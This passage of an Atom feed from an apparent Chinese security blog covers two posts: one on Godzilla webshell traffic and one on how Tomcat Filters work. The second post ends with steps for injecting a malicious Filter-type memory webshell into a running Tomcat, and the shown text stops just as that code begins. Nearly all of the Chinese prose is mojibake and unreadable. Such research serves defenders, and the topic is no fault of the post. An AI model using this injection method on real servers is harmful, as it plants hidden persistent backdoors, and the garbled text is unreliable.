t;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨å“¥æ–¯æ‹‰ä¸»ç•Œé¢ï¼Œç‚¹å‡»æµ‹è¯•ä¼šåœ¨burpå‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç„¶åå“¥æ–¯æ‹‰ä¼šå¼¹æ¡†å‡ºç°Successï¼Œè¿™æ—¶å€™å†ç‚¹å‡»ç¡®å®šï¼Œå“¥æ–¯æ‹‰ä¼šå‘èµ·ç¬¬ä¸‰æ¬¡è¯·æ±‚ï¼Œå…ˆåˆ†æè¿™ä¸‰æ¬¡è¯·æ±‚çš„æ•°æ®åŒ…ä»¥åŠå“¥æ–¯æ‹‰éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ã€‚&lt;br&gt;&lt;img src=&quot;/2022/05/17/godzilla/1.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;ç¬¬ä¸€æ¬¡è¯·æ±‚&quot;&gt;&lt;a href=&quot;#ç¬¬ä¸€æ¬¡è¯·æ±‚&quot; class=&quot;headerlink&quot; title=&quot;ç¬¬ä¸€æ¬¡è¯·æ±‚&quot;&gt;&lt;/a&gt;ç¬¬ä¸€æ¬¡è¯·æ±‚&lt;/h3&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>Javaå®‰å…¨ç¬”è®°(3)-å†…å­˜é©¬ä¹‹Filterå‹</title>
    <link href="https://jkme.github.io/2022/04/14/memory-shell-1.html"/>
    <id>https://jkme.github.io/2022/04/14/memory-shell-1.html</id>
    <published>2022-04-13T16:00:00.000Z</published>
    <updated>2022-04-22T07:21:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p><img src="/2022/04/14/memory-shell-1/Servlet.png"></p><p>å½“å¤„ç†è¯·æ±‚çš„æ—¶å€™ï¼šè¯·æ±‚ â†’ Listener â†’ Filter â†’ Servlet</p><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>Listenerä¹Ÿç§°ä¹‹ä¸ºç›‘å¬å™¨ï¼Œå¯ä»¥ç›‘å¬Applicationã€Sessionå’ŒRequestå¯¹è±¡çš„åˆ›å»ºã€é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬å¯¹å…¶ä¸­æ·»åŠ ã€ä¿®æ”¹ã€åˆ é™¤å±æ€§äº‹ä»¶ï¼Œå¹¶è‡ªåŠ¨æ‰§è¡Œè‡ªå®šä¹‰çš„åŠŸèƒ½ã€‚</p><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>Filterä¹Ÿç§°ä¹‹ä¸ºè¿‡æ»¤å™¨ï¼Œå¯ä»¥åŠ¨æ€åœ°ä¿®æ”¹HttpServletRequestï¼ŒHttpServletResponseä¸­çš„å¤´å’Œæ•°æ®ã€‚</p><h4 id="Servlet-1"><a href="#Servlet-1" class="headerlink" title="Servlet"></a>Servlet</h4><p>Servletæ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚å®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚ç”Ÿæˆç›¸åº”çš„è¿”å›ä¿¡æ¯æä¾›ç»™ç”¨æˆ·ã€‚Servlet å¯ä»¥ç†è§£ä¸ºæŸä¸€ä¸ªè·¯å¾„åç»­çš„ä¸šåŠ¡å¤„ç†é€»è¾‘ã€‚</p><p>Tomcatæ˜¯httpæœåŠ¡å™¨+servletå®¹å™¨ï¼Œå½“Tomcatä½œä¸ºServletå®¹å™¨çš„æ—¶å€™ï¼Œè®²httpè¯·æ±‚æ–‡æœ¬è§£æä¹‹åå°è£…æˆ<code>HttpServletRequest</code>ç±»å‹çš„requestå¯¹è±¡ï¼Œä¼ é€’ç»™Servletï¼ŒåŒæ—¶è®²ç›¸åº”çš„ä¿¡æ¯å°è£…ä¸º<code>HttpServletResponse</code>ç±»å‹çš„responseå¯¹è±¡ï¼Œå°†responseå¯¹è±¡äº¤ç»™tomcatï¼Œtomcatæ ¼å¼åŒ–ä¹‹åè¿”å›ç»™æµè§ˆå™¨</p><h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h4 id="å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰"><a href="#å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰" class="headerlink" title="å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰"></a>å®¹å™¨ç»„ä»¶ï¼ˆContainerï¼‰</h4><p>Tomcatæœ‰å››ç§ç±»å‹çš„Servletå®¹å™¨ç»„ä»¶ï¼Œä»ä¸Šåˆ°ä¸‹ï¼š</p><ol><li>Engineï¼š<code>org.apache.catalina.core.StandardEngine</code><ul><li>æœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ªHost</li></ul></li><li>Host: <code>org.apache.catalina.core.StandardHost</code><ul><li>ä¸€ä¸ªHostä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Contextã€‚</li></ul></li><li>Context: <code>org.apache.catalina.core.StandardContext</code><ul><li>ä¸€ä¸ªContext ä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ª Wrapper</li></ul></li><li>Wrapper: <code>org.apache.catalina.core.StandardWrapper</code><ul><li>ä¸€ä¸ªWrapper ä»£è¡¨ä¸€ä¸ªServlet</li></ul></li></ol><p>æ¯ä¸ªHostä¸‹å¯ä»¥æœ‰å¤šä¸ªContextï¼ˆContextæ˜¯Hostçš„å­å®¹å™¨ï¼‰ï¼Œæ¯ä¸ªContextéƒ½ä»£è¡¨ä¸€ä¸ªå…·ä½“çš„Webåº”ç”¨ï¼Œéƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„è·¯å¾„å°±ç›¸å½“äºä¸‹å›¾ä¸­çš„<code>/shop/manager</code>è¿™ç§ï¼Œåœ¨ä¸€ä¸ª Contextä¸‹å¯ä»¥æœ‰ç€å¤šä¸ªWrapper, Wrapperä¸»è¦è´Ÿè´£ç®¡ç†Servlet, åŒ…æ‹¬çš„Servletçš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶</p><p><img src="/2022/04/14/memory-shell-1/1.png"></p><h2 id="Context"><a href="#Context" class="headerlink" title="*Context"></a>*Context</h2><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><p>åœ¨<code>javax.servlet.ServletContext</code>é‡Œé¢ï¼ŒServletè§„å®šäº†<code>ServletContext</code>æ¥å£:<br><img src="/2022/04/14/memory-shell-1/2.png"></p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>åœ¨<code>org.apache.catalina.core.ApplicationContext</code>é‡Œé¢ï¼Œ<code>ApplicationContext</code>ç±»æ˜¯<code>ServletContext</code>çš„æ¥å£å®ç°ï¼Œ<code>ApplicationContext</code>ç±»çš„å®ä¾‹å’Œ<code>StandardContext</code>çš„æ¯ä¸ªå®ä¾‹ç›¸å…³è”ï¼Œæ¯”å¦‚å‘<code>StandardContext</code>å®ä¾‹æ·»åŠ <code>fiterDef</code>ç­‰<br><img src="/2022/04/14/memory-shell-1/3.png"></p><h4 id="StanderContext"><a href="#StanderContext" class="headerlink" title="StanderContext"></a>StanderContext</h4><p><code>org.apache.catalina.Context</code>çš„é»˜è®¤æ ‡å‡†å®ç°ä¸º<code>org.apache.catalina.core.StandardContext</code>ï¼Œè¡¨ç¤ºæ¯ä¸€ä¸ªwebåº”ç”¨</p><h2 id="Tomcatä¸‹Filterçš„å®ç°é€»è¾‘"><a href="#Tomcatä¸‹Filterçš„å®ç°é€»è¾‘" class="headerlink" title="Tomcatä¸‹Filterçš„å®ç°é€»è¾‘"></a>Tomcatä¸‹Filterçš„å®ç°é€»è¾‘</h2><h3 id="Filterçš„åˆå§‹åŒ–"><a href="#Filterçš„åˆå§‹åŒ–" class="headerlink" title="Filterçš„åˆå§‹åŒ–"></a>Filterçš„åˆå§‹åŒ–</h3><p>åœ¨IDEAé‡Œé¢æ–°å»ºé¡¹ç›®ä¹‹åæ–°å¢æµ‹è¯•ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestFilter.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> servletRequest<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> servletResponse<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> filterChain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Filter Exec doFilter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        filterChain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>servletRequest<span class="token punctuation">,</span> servletResponse<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TestServlet.java</span><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"TestServlet"</span><span class="token punctuation">,</span> urlPatterns <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/TestServlet"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doGet</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello GET~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">&#123;</span>        <span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello POST~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶ååœ¨<code>web.xml</code>é‡Œé¢æ–°å¢Filterçš„é…ç½®é¡¹ï¼š</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>basic.TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>TestFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/TestServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨web.xmlè¿™ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œ<code>&lt;filter&gt;&lt;/filter&gt;</code>æ ‡ç­¾å…¶å®å¯¹åº”çš„å°±æ˜¯<code>org.apache.tomcat.util.descriptor.web.FilterDef</code>ï¼Œ<code>&lt;filter-mapping&gt;&lt;/filter-mapping&gt;</code>æ ‡ç­¾å¯¹åº”çš„æ˜¯<code>org.apache.tomcat.util.descriptor.web.FilterMap</code></p><p>åœ¨<code>StandardContext</code>ç±»ä¸­çš„startInternalæ–¹æ³•é‡Œå¯ä»¥çœ‹åˆ°è¿™æ ·çš„åŠ è½½é¡ºåº:<br><img src="/2022/04/14/memory-shell-1/tomcat-1.png"><br>å…ˆå¯åŠ¨listenerï¼Œå†è€…æ˜¯Filterï¼Œæœ€åæ˜¯Servletã€‚è¯¦ç»†åˆ†æfilterStartä¸­æ˜¯å¦‚ä½•åŠ è½½Filteré“¾çš„ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹å›¾æ‰€ç¤º:<br><img src="/2022/04/14/memory-shell-1/tomcat-2.png"><br>é¦–å…ˆé€šè¿‡éå†ä»filterDefsä¸­è·å–keyå’Œvalueï¼Œå°†valueå°è£…ä¸º<code>ApplicationFilterConfig</code>å¯¹è±¡æ”¾å…¥<code>filterConfigs</code>å˜é‡ä¸­ã€‚<br>ç„¶ååœ¨<code>StandardContext</code>çš„addæ–¹æ³•ä¸‹æ–­ç‚¹ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-3.png"></p><p>Tomcatä¼šå…ˆåœ¨<code>ContextConfig.java</code>é‡Œé¢ä»<code>web.xml</code>è¯»å–å·²å®šä¹‰çš„Filterï¼Œç„¶ååŠ å…¥åˆ°<code>StandardContext</code>çš„å®ä¾‹åŒ–<code>context</code>é‡Œé¢ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-4.png"><br>ä¸Šé¢çš„ä¸¤ä¸ªæ–¹æ³•éƒ½åœ¨<code>StandardContext</code>é‡Œé¢ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-5.png"></p><p>æ¥ç€æ˜¯<code>org.apache.catalina.core.StandardContext#filterStart</code>æ ¹æ®å·²æœ‰çš„<code>filterDefs</code>ï¼Œéå†ä¹‹åå­˜å‚¨åˆ°<code>filterConfigs</code>é‡Œé¢ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-6.png"></p><p>ç»è¿‡ä¸Šé¢å‡ ä¸ªæ­¥éª¤çš„å¤„ç†ï¼Œtomcatå¯åŠ¨åˆå§‹åŒ–å®Œæˆï¼ŒæŠŠweb.xmlé‡Œé¢çš„FilteråŒ…è£…å¥½ä¹‹åæ”¾åœ¨äº†<code>StandardContext</code>ã€‚<br>æ€»ç»“æ¥è¯´æ˜¯è¿™å‡ ä¸ªæ­¥éª¤ï¼š</p><ol><li>æˆ‘ä»¬åœ¨ä»£ç é‡Œé¢å®šä¹‰å¥½Filterçš„å¤„ç†é€»è¾‘</li><li>Tomcatæ ¹æ®web.xmlçš„é…ç½®åŒ…è£…æˆFilterDefå’ŒFilterMapï¼Œåˆ†åˆ«æ·»åŠ åˆ°filterDefså’ŒfilterMapsï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡çš„å®šä¹‰éƒ½åœ¨<code>org.apache.tomcat.util.descriptor.web</code>åŒ…é‡Œé¢</li><li>éå†<code>filterDefs</code>å¯¹è±¡ä½¿ç”¨<code>ApplicationFilterConfig</code>å¯¹valueè¿›è¡Œå°è£…ï¼Œå°è£…ä¹‹åçš„å¯¹è±¡æ”¾å…¥<code>filterConfigs</code>ä¸­</li><li>è¿™ä¸ªæ—¶å€™åœ¨<code>StandardContext</code>é‡Œé¢æœ‰ä¸‰ç§å¯¹è±¡åˆå§‹åŒ–å®Œæˆï¼š <code>FilterDefs</code>ã€<code>Filterconfigs</code>ã€<code>FilterMaps</code></li></ol><p> PS: å†è¿™ä¸ªé˜¶æ®µTomcatä¼šè¿è¡ŒFilteré‡Œé¢çš„ä»£ç </p><h3 id="Filterçš„è¿è¡Œé€»è¾‘"><a href="#Filterçš„è¿è¡Œé€»è¾‘" class="headerlink" title="Filterçš„è¿è¡Œé€»è¾‘"></a>Filterçš„è¿è¡Œé€»è¾‘</h3><p>ä»¥ä¸Šæ˜¯Tomcatå¯åŠ¨è¿‡ç¨‹ï¼Œå›åˆ°ä¸Šé¢è®²çš„tomcatå®¹å™¨ç»„ä»¶å…³ç³»å›¾ï¼Œ åœ¨å®¹å™¨ç»„ä»¶ç»“æ„ä¸­æœ€åº•å±‚çš„æ˜¯<code>org.apache.catalina.core.StandardWrapper</code>ï¼Œåœ¨å¯¹åº”çš„æºä»£ç é‡Œé¢å¯ä»¥çœ‹åˆ°æ„é€ å‡½æ•°ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * Create a new StandardWrapper component with the default basic Valve. */</span><span class="token keyword">public</span> <span class="token class-name">StandardWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    swValve<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">StandardWrapperValve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    pipeline<span class="token punctuation">.</span><span class="token function">setBasic</span><span class="token punctuation">(</span>swValve<span class="token punctuation">)</span><span class="token punctuation">;</span>    broadcaster <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NotificationBroadcasterSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>é‡Œé¢è°ƒç”¨äº†Filterç›¸å…³çš„é€»è¾‘ä»£ç ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-7.png"><br>æ­¤æ—¶å‘èµ·ä¸€ä¸ªGetè¯·æ±‚ï¼Œæ‰“æ–­ç‚¹è·Ÿè¿›<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-8.png"><br>åˆ°æœ€åè¿”å›äº†filterChainså¯¹è±¡ï¼Œæ¥ç€è¿”å›æ‰§è¡Œ<code>filterChain.doFilter(request.getRequest(), response.getResponse());</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-9.png"></p><p>è·Ÿè¿›ä¹‹åä¼šè¿›å…¥åˆ°<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>:<br><img src="/2022/04/14/memory-shell-1/tomcat-10.png"></p><p>è·Ÿè¿›ä¹‹åè¿›å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„Filteré€»è¾‘é‡Œé¢å»ï¼š<br><img src="/2022/04/14/memory-shell-1/tomcat-11.png"></p><p>æ¥è‡ªå®½å­—èŠ‚å¸ˆå‚…çš„æ€»ç»“å›¾ï¼š<br><img src="/2022/04/14/memory-shell-1/filter.png"></p><p>æ¥è‡ª<a href="http://wjlshare.com/archives/1529">å¤§æœ¨å¤´å¸ˆå‚…</a>çš„æ€»ç»“:</p><blockquote><ol><li>æ ¹æ®è¯·æ±‚çš„URLä»FilterMapsä¸­æ‰¾å‡ºä¸ä¹‹URLå¯¹åº”çš„Filteråç§°</li><li>æ ¹æ®Filteråç§°å»FilterConfigsä¸­å¯»æ‰¾å¯¹åº”åç§°çš„FilterConfig</li><li>æ‰¾åˆ°å¯¹åº”çš„FilterConfigä¹‹åæ·»åŠ åˆ° FilterChainä¸­ï¼Œå¹¶ä¸”è¿”å›FilterChain</li><li>filterChainä¸­è°ƒç”¨ internalDoFilteréå†è·å– chain ä¸­çš„ FilterConfig ï¼Œç„¶åä»FilterConfigä¸­è·å–Filterï¼Œç„¶åè°ƒç”¨Filterçš„doFilteræ–¹æ³•</li></ol></blockquote><p>è‡³æ­¤Filterçš„å¤„ç†æµç¨‹åˆ†æå®Œæˆï¼Œä¸»è¦åˆ†ä¸¤ä¸ªå¤§éƒ¨åˆ†ï¼ŒFilterçš„åˆå§‹åŒ–å’ŒFilterçš„è¿è¡Œé€»è¾‘ï¼Œå¦‚æœè¦åœ¨tomcaté‡Œé¢æ’å…¥Filterç±»å‹çš„æœ¨é©¬ï¼Œé¦–å…ˆéœ€è¦åœ¨ä»£ç é‡Œé¢å®ŒæˆFilteråˆå§‹åŒ–çš„æµç¨‹ï¼š</p><ol><li>åˆ›å»ºæ¶æ„Filter</li><li>ä½¿ç”¨FilterDefå¯¹FilteråŒ…è£…</li><li>å°†FilterDefåŠ å…¥åˆ°<code>FilterDefs</code>ï¼Œéå†<code>FilterDefs</code>åŒ…è£…ä¸º<code>FilterConfigs</code></li><li>åˆ›å»ºFilterMapï¼Œå°†Filterå’Œurlpatternå¯¹åº”ï¼Œå­˜æ”¾åˆ°<code>filterMaps</code></li><li>æŠŠåˆ›å»ºçš„<code>FilterDefs</code>ã€<code>Filterconfigs</code>ã€<code>FilterMaps</code>æ”¾åˆ°<code>StandardContext</code></li></ol><h2 id="åˆ›å»ºå†…å­˜é©¬"><a href="#åˆ›å»ºå†…å­˜é©¬" class="headerlink" title="åˆ›å»ºå†…å­˜é©¬"></a>åˆ›å»ºå†…å­˜é©¬</h2><p>ä¸ºäº†è·å–åˆ°<code>StandardContext</code>å¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦å…ˆææ¸…æ¥šè¿™ä¸ªå¯¹è±¡åœ¨æ•´Tomcaté‡Œé¢çš„ç»“æ„ä½ç½®ï¼š<br><code>StandardContext</code> â€“&gt; <code>ApplicationContext</code> â€“&gt; <code>ApplicationContextFacade</code></p><p>ä»æœ€ä¸Šå±‚å¼€å§‹åœ¨<code>org.apache.catalina.core.ApplicationContextFacade</code>å¯ä»¥æ‰¾åˆ°<code>ApplicationContext</code>:<br><img src="/2022/04/14/memory-shell-1/context-1.png"><br>æ ¹æ®å­¦åˆ°çš„åå°„åŸç†å’Œç½‘ä¸Šå¤§éƒ¨åˆ†Filterç±»å‹çš„å†…å­˜é©¬ï¼Œè°ƒè¯•å¦‚ä¸‹çš„ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.lang.reflect.Field"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token 